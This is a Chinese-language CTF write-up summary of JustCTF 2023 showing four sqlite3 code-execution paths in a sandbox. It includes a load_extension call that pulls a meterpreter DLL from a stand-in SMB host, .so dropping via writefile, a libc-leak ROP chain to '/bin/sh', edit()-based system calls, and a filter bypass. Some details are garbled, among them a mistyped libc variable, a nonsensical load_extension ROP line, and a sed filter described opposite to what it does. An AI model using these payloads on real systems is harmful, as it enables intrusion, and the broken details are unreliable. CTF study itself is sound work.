---
title: 从JustCTF 2023中学到的sqlite3代码执行方法
contest: JustCTF 2023
year: 2023
difficulty: hard
vuln_type: rce
tags: [sqlite3, load_extension, writefile, FFI, 沙箱逃逸, ROP, libc.so.6, .open :memory:, edit函数]
attack_chain:
  - 路径 1: load_extension SMB 共享 `\\evilhost\share\meterpreter.dll` 加载 Windows 攻击载荷
  - 路径 2: CREATE TABLE images + cast x'hex' as text 写入 .so 字节
  - 用 SELECT writefile('./exp.so', img) 把 BLOB 落地
  - SELECT load_extension('./exp', 'exp') 加载 .so 触发 _init
  - 路径 3 (作者解): load_extension('/lib/x86_64-linux-gnu/libc.so.6', 'puts') 泄 libc
  - 计算 pie_base 后用 gets+system 构造 ROP
  - heap+0x11eb0+system_plt 把 argv 指向 '/bin/sh'
  - 路径 4: .open :memory: 创建内存数据库
  - sqlite3_create_function 注册 edit(zCmd, zTempFile) 自定义函数
  - update t set b=edit('','/jailed/readflag') 调用 system
key_payload: 'justCTF{SQL1t3_F34tur3_n0t_bug_Int3nd3d!11!!!111!!1}'
one_liner: sqlite3 三种代码执行姿势：load_extension SMB / writefile 落 .so / 自定义函数 .open :memory:。
lesson: sqlite3 的 load_extension 允许任意 .so/.dll，是 PWN 题沙箱逃逸金钥匙；.open :memory: 可绕过文件权限，结合 sqlite3_create_function 注册 system 调用是 CTF 隐藏赛道。
quality: high
---

# 从JustCTF 2023中学到的sqlite3代码执行方法

## 概览
- **来源**: ctfiot 117905
- **目标**: 拿到沙箱里 sqlite3 进程的 readflag
- **难度**: ⭐⭐⭐⭐

## 四种 RCE 路径
1. **SMB 远程 .dll**: `load_extension('\\\\evilhost\\evilshare\\meterpreter.dll', 'DllMain')` (Windows)
2. **本地 .so 加载**: CREATE TABLE → INSERT hex → writefile → load_extension('./exp', 'exp')
3. **libc FFI**: `load_extension('/lib/x86_64-linux-gnu/libc.so.6', 'puts')` 泄地址后 ROP
   - `pie_base = lic - 0x1589a0`
   - `heap = 0x00005555556b0000 - 0x0000555555554000 + pie_base`
   - 构造 `cast(x'...hex' as text), Load_extension('system_plt','/bin/sh')`
4. **edit 自定义函数**: `.open :memory:` → `CREATE TABLE t(a INT, b)` → `INSERT t VALUES(0, '')` → `UPDATE t SET b=edit('','/jailed/readflag')`
   - edit() 内部: `sqlite3_mprintf("%s \"%s\"", zEditor, zTempFile); rc = system(zCmd);`

## 沙箱绕过
- `run-sqlite.sh` 过滤了 `.open` 但没过滤 `:memory:`
- `sed -ue '/^\./ { /^\.open/!d; }'` 只删 `.open` 行

## flag
- `justCTF{SQL1t3_F34tur3_n0t_bug_Int3nd3d!11!!!111!!1}`

## 工具
- pwntools + binascii
